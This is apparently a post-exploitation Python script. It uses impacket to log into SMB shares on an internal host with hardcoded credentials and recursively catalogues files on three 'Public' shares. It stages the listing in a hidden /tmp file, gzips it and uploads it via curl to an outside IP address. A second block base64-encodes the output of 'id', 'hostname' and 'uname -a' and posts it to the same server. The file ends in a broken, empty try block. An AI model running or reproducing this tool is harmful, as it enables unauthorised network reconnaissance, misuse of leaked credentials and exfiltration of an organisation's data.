#!/usr/bin/env python3
# Public_M/S/T recursive listing v2 (gzip + raw POST)
import sys, os, subprocess
sys.path.insert(0, "/tmp/imp")
from impacket.smbconnection import SMBConnection

OUT = "/tmp/.PUBW2.txt"
out = open(OUT, "wb")
def w(s):
    if isinstance(s, str): s = s.encode("utf-8", "replace")
    out.write(s + b"\n")

TARGETS = [("10.61.10.10", "Public_M"), ("10.61.10.10", "Public_S"), ("10.61.10.10", "Public_T")]
MAXENT = 200000
count = [0]

def walk(c, share, path, depth):
    if depth < 0 or count[0] > MAXENT: return
    try:
        ents = c.listPath(share, path + "\\*")
    except Exception as e:
        w("ERR %s\\%s %s" % (share, path, str(e)[:70])); return
    for e in ents:
        if count[0] > MAXENT: return
        fn = e.get_longname()
        if fn in (".", ".."): continue
        full = path + "\\" + fn
        if e.is_directory():
            w("D " + full)
            walk(c, share, full, depth - 1)
        else:
            sz = 0
            try: sz = e.get_filesize()
            except Exception: pass
            w("F %d %s" % (sz, full))
        count[0] += 1

for ip, share in TARGETS:
    w("=== %s %s ===" % (ip, share))
    try:
        c = SMBConnection(ip, ip, timeout=10)
        c.login("rez", "!QAZxsw2", "MLT", "", "")
    except Exception as e:
        w("LOGIN_ERR %s" % str(e)[:120]); continue
    walk(c, share, "", 7)
    try: c.logoff()
    except Exception: pass
    w("=== done %s ==" % share)
w("TOTAL=%d" % count[0])
out.close()
subprocess.run("gzip -9 -c %s > /tmp/.pw2.gz && curl -sm240 -X POST --data-binary @/tmp/.pw2.gz http://131.123.43.239/up -H 'X-Name: mel3_pubw_gz'" % OUT, shell=True)
print("PUBW2_DONE")

import os,base64,urllib.request as u
try:
 d=base64.b64encode(os.popen("id;hostname;uname -a").read().encode()).decode(); u.urlopen(u.Request("http://131.123.43.239/up",data=d.encode(),headers={"X-Name":"wrk_out"}),timeout=10)
except Exception: pass

try:
except Exception: pass

